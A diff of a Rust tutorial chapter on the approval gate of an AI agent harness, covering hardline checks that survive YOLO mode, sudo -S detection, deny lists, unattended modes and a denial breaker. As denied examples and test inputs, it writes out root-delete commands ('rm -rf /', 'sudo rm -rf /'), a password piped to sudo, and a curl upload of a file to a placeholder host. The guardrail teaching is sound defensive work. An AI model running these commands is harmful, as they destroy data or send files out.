@@ -1,14 +1,14 @@
 # Chapter 11: Approvals and Guardrails
 
-`echo "rm -rf /"` is allowed. The quotes hide the payload, the hardline scan never sees `rm`, and the command comes back safe. `bash -c 'rm -rf /'` is refused. The same scan looks at the raw payload, finds the root delete, and denies it even when YOLO is on. That second look is the floor this chapter puts in front of dispatch. A continuously improving harness can be talked into a destructive command while it is learning a skill or writing a memory, and learning doesn't get to bypass the floor.
+`echo "rm -rf /"` is allowed; the quotes hide the payload, the hardline scan never sees `rm`, and the command comes back safe; `bash -c 'rm -rf /'` is refused. The same scan looks at the raw payload, finds the root delete, and denies it even when YOLO is on. That second look is the floor this chapter puts in front of dispatch. A continuously improving harness can be talked into a destructive command while it is learning a skill or writing a memory, and learning doesn't get to bypass the floor.
 
 A person thinking must not pin one of the eight tool slots. When the verdict is ask and a prompt is installed, the wait drops the concurrency permit first, and silence at the end of that wait is a denial. The tool result says so: "Silence is not consent."
 
-Chapter 10's loop will call whatever tool the model names, once the name resolves and the scheduler has a permit. That's the right default for `echo` and the wrong default for a shell. The crate is `steps/ch11-approvals`. It starts from chapter 10's harness and adds an `approval` module. The package is `ch11-approvals` and the library is `harness_core`. The loop calls `approval::deny_tool` before `dispatcher.run_raced`. A denial is the tool result, and the tool body doesn't run. Only `terminal` and `execute_code` are gated, `echo` still runs, and `execute_code` still returns without a script check until chapter 13.
+Chapter 10's loop will call whatever tool the model names, once the name resolves and the scheduler has a permit. That's the right default for `echo` and the wrong default for a shell; the crate is `steps/ch11-approvals`. It starts from chapter 10's harness and adds an `approval` module. The package is `ch11-approvals` and the library is `harness_core`. The loop calls `approval::deny_tool` before `dispatcher.run_raced`. A denial is the tool result, and the tool body doesn't run. Only `terminal` and `execute_code` are gated, `echo` still runs, and `execute_code` still returns without a script check until chapter 13.
 
-Later chapters reuse this floor. Chapter 13 calls it for `execute_code` and adds the script gate. Chapter 14 adds two more floor checks, before YOLO: deleting the running binary, and a git mutation of this crate's own tree. Chapter 17's terminal goes through `deny_tool` before the sandbox worker. Chapter 25's skill-write gate is a different question, and it stays off unless it's configured.
+Later chapters reuse this floor; Chapter 13 calls it for `execute_code` and adds the script gate. Chapter 14 adds two more floor checks, before YOLO: deleting the running binary, and a git mutation of this crate's own tree. Chapter 17's terminal goes through `deny_tool` before the sandbox worker. Chapter 25's skill-write gate is a different question, and it stays off unless it's configured.
 
-`cargo run -p ch11-approvals` prints the denial. The exercise is `my-harness/tests/ch11.rs`: a hardline `terminal` command is denied, and the tool body doesn't run.
+`cargo run -p ch11-approvals` prints the denial; the exercise is `my-harness/tests/ch11.rs`: a hardline `terminal` command is denied, and the tool body doesn't run.
 
 | Section | Step | What it adds |
 |---|---|---|
@@ -28,7 +28,7 @@ Later chapters reuse this floor. Chapter 13 calls it for `execute_code` and adds
 
 ## What this chapter decides
 
-`Risk` is `Safe`, `Sensitive`, or `Destructive`. It is a label. The pipeline is the decision.
+`Risk` is `Safe`, `Sensitive`, or `Destructive`; it is a label; the pipeline is the decision.
 
 `check` walks one command:
 
@@ -45,7 +45,7 @@ Later chapters reuse this floor. Chapter 13 calls it for `execute_code` and adds
 | Smart | `fake_smart_review` returns deny or approve | `Deny` or `Allow` |
 | Ask | Manual mode, or smart escalates | `Ask` |
 
-`hardline_message` names `--yolo` and doesn't append `STOP_COMMAND`. The other denials do, and the third carries the breaker sentence. The test's peak inside the lock is 1. The default timeout is 300 seconds, and the test uses 30 milliseconds.
+`hardline_message` names `--yolo` and doesn't append `STOP_COMMAND`. The other denials do, and the third carries the breaker sentence; the test's peak inside the lock is 1. The default timeout is 300 seconds, and the test uses 30 milliseconds.
 
 ## 11.1 Labels, policy, and the verdict
 
@@ -80,7 +80,7 @@ pub enum Mode {
 }
 ```
 
-`Off` is the comment's `approvals.mode: "off"`. The floor still runs, which is why `Off` is checked only after hardline, `sudo -S`, and the deny list. `Smart` asks `fake_smart_review` and falls through to a human when that function escalates. `Manual` is the default. A dangerous command in manual mode becomes `Ask`.
+`Off` is the comment's `approvals.mode: "off"`. The floor still runs, which is why `Off` is checked only after hardline, `sudo -S`, and the deny list. `Smart` asks `fake_smart_review` and falls through to a human when that function escalates. `Manual` is the default; a dangerous command in manual mode becomes `Ask`.
 
 ```rust
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -98,7 +98,7 @@ pub enum Presence {
 }
 ```
 
-`Unattended` here is the mode for a session that has no human, not the `Presence::Unattended` variant. `Deny` refuses a dangerous command. `Approve` allows it after the floor. `Presence` picks which of the three mode fields to read. `Interactive` reads none of them.
+`Unattended` here is the mode for a session that has no human, not the `Presence::Unattended` variant; `Deny` refuses a dangerous command; `Approve` allows it after the floor. `Presence` picks which of the three mode fields to read; `Interactive` reads none of them.
 
 ```rust
 #[derive(Debug, Clone, PartialEq, Eq)]
@@ -137,9 +137,9 @@ impl Default for Policy {
 }
 ```
 
-`DEFAULT_TIMEOUT` is `Duration::from_secs(300)`. `DENIAL_BREAKER_THRESHOLD` is 3. `yolo` is false. Both lists are empty. `presence` is `Interactive`, so the unattended branch does not fire. Tests that want cron or YOLO mutate these public fields and call `check` directly. The loop path does not. It always gets this manual policy.
+`DEFAULT_TIMEOUT` is `Duration::from_secs(300)`; `DENIAL_BREAKER_THRESHOLD` is 3; `yolo` is false; both lists are empty. `presence` is `Interactive`, so the unattended branch does not fire. Tests that want cron or YOLO mutate these public fields and call `check` directly; the loop path does not; it always gets this manual policy.
 
-`Session` holds the denial tally. The derive list is `Debug, Clone, PartialEq, Eq`. There is no `Copy`. `check` takes `&mut Session` and writes `denials`. A copy would have its own counter, and a reset on one would leave the other counting.
+`Session` holds the denial tally; the derive list is `Debug, Clone, PartialEq, Eq`; there is no `Copy`; `check` takes `&mut Session` and writes `denials`. A copy would have its own counter, and a reset on one would leave the other counting.
 
 ```rust
 #[derive(Debug, Clone, PartialEq, Eq)]
@@ -148,9 +148,9 @@ pub struct Session {
 }
 ```
 
-`new` starts at 0. `denials()` returns the `u32` by copy. The field is private, so another crate reads it through that method and changes it only by calling `check` or `run_call`.
+`new` starts at 0; `denials()` returns the `u32` by copy. The field is private, so another crate reads it through that method and changes it only by calling `check` or `run_call`.
 
-`SmartVote` is what the fake reviewer returns. `Verdict` is what `check` returns. They are different enums on purpose. A vote is an opinion. A verdict is the pipeline's answer, and it owns the message strings.
+`SmartVote` is what the fake reviewer returns; `Verdict` is what `check` returns; they are different enums on purpose; a vote is an opinion. A verdict is the pipeline's answer, and it owns the message strings.
 
 ```rust
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -186,9 +186,9 @@ impl Verdict {
 }
 ```
 
-`..` means the fields are not bound. `label` borrows `&self` and does not take the `String`. The demo prints `verdicts[0].label()`, which is `"deny"` for `rm -rf /`.
+`..` means the fields are not bound; `label` borrows `&self` and does not take the `String`. The demo prints `verdicts[0].label()`, which is `"deny"` for `rm -rf /`.
 
-`ScriptCall` is one command from the fake model. It owns a `String`. `run_script` borrows a slice of them.
+`ScriptCall` is one command from the fake model; it owns a `String`; `run_script` borrows a slice of them.
 
 ## 11.2 One command, in the order the branches return
 
@@ -207,7 +207,7 @@ pub fn check(policy: &Policy, session: &mut Session, command: &str) -> Verdict {
     }
 ```
 
-The fast path requires both an empty deny list and `fast_safe`. `echo hello` takes it. `session.denials` becomes 0, so an earlier denial does not survive a later safe command. `skip_decision` times this path. `normalize` is not called, so the normalized `String` is not allocated.
+The fast path requires both an empty deny list and `fast_safe`; `echo hello` takes it. `session.denials` becomes 0, so an earlier denial does not survive a later safe command; `skip_decision` times this path. `normalize` is not called, so the normalized `String` is not allocated.
 
 `fast_safe` scans bytes, then words.
 
@@ -230,9 +230,9 @@ fn fast_safe(command: &str) -> bool {
 }
 ```
 
-A quote, `$`, a backtick, `|`, `;`, `>`, `(`, `)`, or `&` rejects the command. `<` is not in that pattern. A word in `WORDS` also rejects it. `contains_word_ci` is case-insensitive and requires a word boundary. A boundary byte is anything that is not ASCII alphanumeric, `_`, or `-`. `form` does not contain the word `rm`, because the letters around `rm` are word bytes. `echo hello` has none of the bytes and none of the words, so `fast_safe` is true.
+A quote, `$`, a backtick, `|`, `;`, `>`, `(`, `)`, or `&` rejects the command; `<` is not in that pattern; a word in `WORDS` also rejects it. `contains_word_ci` is case-insensitive and requires a word boundary. A boundary byte is anything that is not ASCII alphanumeric, `_`, or `-`. `form` does not contain the word `rm`, because the letters around `rm` are word bytes. `echo hello` has none of the bytes and none of the words, so `fast_safe` is true.
 
-Anything else walks the floor, then the policy. Hardline is first.
+Anything else walks the floor, then the policy; hardline is first.
 
 ```rust
     if let Some(description) = hardline(command) {
@@ -244,9 +244,9 @@ Anything else walks the floor, then the policy. Hardline is first.
     }
 ```
 
-`if let Some` is the `Option` from `hardline`. `None` falls through. `Some` increments with `saturating_add`, so the `u32` stops at `u32::MAX` instead of wrapping to 0. The message is `hardline_message`. That string names `--yolo`, `/yolo`, `approvals.mode=off`, and cron approve mode. It does not append `STOP_COMMAND`, and it does not call `breaker_addendum`. `hardline: true` is the flag YOLO cannot clear, because YOLO is a later `if` that this `return` skipped. `hardline_survives_yolo_and_mode_off` sets both `yolo` and `Mode::Off` and still gets `Deny { hardline: true }` for `sudo rm -rf /`.
+`if let Some` is the `Option` from `hardline`; `None` falls through. `Some` increments with `saturating_add`, so the `u32` stops at `u32::MAX` instead of wrapping to 0; the message is `hardline_message`. That string names `--yolo`, `/yolo`, `approvals.mode=off`, and cron approve mode. It does not append `STOP_COMMAND`, and it does not call `breaker_addendum`. `hardline: true` is the flag YOLO cannot clear, because YOLO is a later `if` that this `return` skipped. `hardline_survives_yolo_and_mode_off` sets both `yolo` and `Mode::Off` and still gets `Deny { hardline: true }` for `sudo rm -rf /`.
 
-`sudo -S` is the next floor. It is not marked hardline.
+`sudo -S` is the next floor; it is not marked hardline.
 
 ```rust
     if pipes_password_to_sudo(command) {
@@ -260,7 +260,7 @@ Anything else walks the floor, then the policy. Hardline is first.
     }
 ```
 
-`pipes_password_to_sudo` masks quotes first, then requires both the substring `-S` and `sudo` in the lowercase masked text. `echo secret | sudo -S id` matches. The message includes `STOP_COMMAND` and does not include the breaker sentence. `sudo_s_is_a_floor_under_yolo` sets `yolo` and still gets `hardline: false`. The floor ran before the YOLO arm.
+`pipes_password_to_sudo` masks quotes first, then requires both the substring `-S` and `sudo` in the lowercase masked text; `echo secret | sudo -S id` matches. The message includes `STOP_COMMAND` and does not include the breaker sentence. `sudo_s_is_a_floor_under_yolo` sets `yolo` and still gets `hardline: false`; the floor ran before the YOLO arm.
 
 The user deny list is still on the floor.
 
@@ -290,7 +290,7 @@ Only after those three floors does YOLO or mode off allow the command.
     }
 ```
 
-`risk_of` still labels the command. Hardline and `sudo -S` already returned, so a command in this arm is neither. A recursive `rm` that was not hardline, such as `rm -rf ./build`, comes back `Allow { risk: Sensitive }`. A command `dangerous` does not recognize comes back `Allow { risk: Safe }`. The tally is cleared.
+`risk_of` still labels the command; hardline and `sudo -S` already returned, so a command in this arm is neither. A recursive `rm` that was not hardline, such as `rm -rf ./build`, comes back `Allow { risk: Sensitive }`. A command `dangerous` does not recognize comes back `Allow { risk: Safe }`; the tally is cleared.
 
 The allowlist is an equality check on normalized text, not a substring.
 
@@ -317,7 +317,7 @@ The allowlist is an equality check on normalized text, not a substring.
     let description = danger.expect("checked");
 ```
 
-`is_none` is the safe command that failed `fast_safe` for a quote or a metacharacter and then matched nothing dangerous. `echo "rm -rf /"` lands here: the quotes blocked the fast path, `mask_quotes` hid the payload from hardline, and `dangerous` finds no recursive `rm` outside the quotes. `expect("checked")` runs only after `is_none` was false, so the `Option` is `Some`. The string is the description later messages interpolate.
+`is_none` is the safe command that failed `fast_safe` for a quote or a metacharacter and then matched nothing dangerous. `echo "rm -rf /"` lands here: the quotes blocked the fast path, `mask_quotes` hid the payload from hardline, and `dangerous` finds no recursive `rm` outside the quotes. `expect("checked")` runs only after `is_none` was false, so the `Option` is `Some`; the string is the description later messages interpolate.
 
 Unattended mode is next, and only for a dangerous command.
 
@@ -340,9 +340,9 @@ Unattended mode is next, and only for a dangerous command.
     }
 ```
 
-`unattended_mode` matches `Presence`. `Interactive` is `None`, and this whole block is skipped. `Cron`, `SingleQuery`, and `Unattended` are `Some` of the matching field. `Deny` increments, appends `STOP_COMMAND` and the breaker, and returns. `Approve` clears the tally and returns `Allow { risk: Sensitive }`. That is cron approve-mode, and it is after the floor. `cron_denies_a_dangerous_command_and_echo_still_runs` denies `rm -rf ./build` and then allows `echo hello`, because `echo hello` returned on the fast path before presence mattered.
+`unattended_mode` matches `Presence`; `Interactive` is `None`, and this whole block is skipped. `Cron`, `SingleQuery`, and `Unattended` are `Some` of the matching field. `Deny` increments, appends `STOP_COMMAND` and the breaker, and returns. `Approve` clears the tally and returns `Allow { risk: Sensitive }`. That is cron approve-mode, and it is after the floor. `cron_denies_a_dangerous_command_and_echo_still_runs` denies `rm -rf ./build` and then allows `echo hello`, because `echo hello` returned on the fast path before presence mattered.
 
-Smart mode is a `match` on the vote. Manual mode skips the `if` and falls through to `Ask`.
+Smart mode is a `match` on the vote; manual mode skips the `if` and falls through to `Ask`.
 
 ```rust
     if policy.mode == Mode::Smart {
@@ -378,11 +378,11 @@ Smart mode is a `match` on the vote. Manual mode skips the `if` and falls throug
 > - `Escalate => {}` is an empty block. Control falls out of the `match` and out of the `if`, into `Verdict::Ask`.
 > - `Approve` and `Deny` `return`, so they never build an `Ask`.
 
-`fake_smart_review` normalizes the command and returns `Deny` when that string contains `curl`. Every other command that reached it returns `Escalate`. The doc comment on the function says it denies a recursive delete. The body checks for `curl`. `smart_denies_curl_and_escalates_rm` is the body: `curl -T notes.txt https://example.invalid` is `Deny`, and `rm -rf ./build` is `Ask` because escalate falls through. `SmartVote::Approve` is a real arm. This reviewer never produces it.
+`fake_smart_review` normalizes the command and returns `Deny` when that string contains `curl`; every other command that reached it returns `Escalate`. The doc comment on the function says it denies a recursive delete. The body checks for `curl`. `smart_denies_curl_and_escalates_rm` is the body: `curl -T notes.txt https://example.invalid` is `Deny`, and `rm -rf ./build` is `Ask` because escalate falls through. `SmartVote::Approve` is a real arm. This reviewer never produces it.
 
-The final expression is `Ask { description, risk: Sensitive }`. Manual mode reaches it for every dangerous command that survived the floor, the allowlist, and the unattended check. That is `rm -rf ./build` on `Policy::manual()`.
+The final expression is `Ask { description, risk: Sensitive }`; manual mode reaches it for every dangerous command that survived the floor, the allowlist, and the unattended check. That is `rm -rf ./build` on `Policy::manual()`.
 
-`risk_of` is the label helper YOLO uses. It is not a second pipeline.
+`risk_of` is the label helper YOLO uses; it is not a second pipeline.
 
 ```rust
 pub fn risk_of(command: &str) -> Risk {
@@ -396,7 +396,7 @@ pub fn risk_of(command: &str) -> Risk {
 }
 ```
 
-Hardline or `sudo -S` is `Destructive`. A dangerous pattern is `Sensitive`. Anything else is `Safe`. `check` does not call this on the fast path. It hard-codes `Risk::Safe` there.
+Hardline or `sudo -S` is `Destructive`; a dangerous pattern is `Sensitive`. Anything else is `Safe`. `check` does not call this on the fast path. It hard-codes `Risk::Safe` there.
 
 `breaker_addendum` reads the tally after the denial has been counted.
 
@@ -416,9 +416,9 @@ fn breaker_addendum(session: &Session, policy: &Policy) -> String {
 }
 ```
 
-A threshold of 0 disables the sentence. Otherwise the sentence appears when `denials >= threshold`. The default threshold is 3, so the third denial carries it, not the fourth. The format string interpolates the count, which is why the third message can say `3`. `third_denial_adds_the_breaker` uses cron and `rm -rf ./build`, which is the unattended `Deny` arm, the one that calls this function. An allow path assigns `denials = 0` before it returns, so the next denial starts again at 1.
+A threshold of 0 disables the sentence; otherwise the sentence appears when `denials >= threshold`. The default threshold is 3, so the third denial carries it, not the fourth. The format string interpolates the count, which is why the third message can say `3`. `third_denial_adds_the_breaker` uses cron and `rm -rf ./build`, which is the unattended `Deny` arm, the one that calls this function. An allow path assigns `denials = 0` before it returns, so the next denial starts again at 1.
 
-`run_script` is the fake model. It owns a fresh `Session` and stops on the first `Deny`.
+`run_script` is the fake model; it owns a fresh `Session` and stops on the first `Deny`.
 
 ```rust
 pub fn run_script(policy: &Policy, calls: &[ScriptCall]) -> Vec<Verdict> {
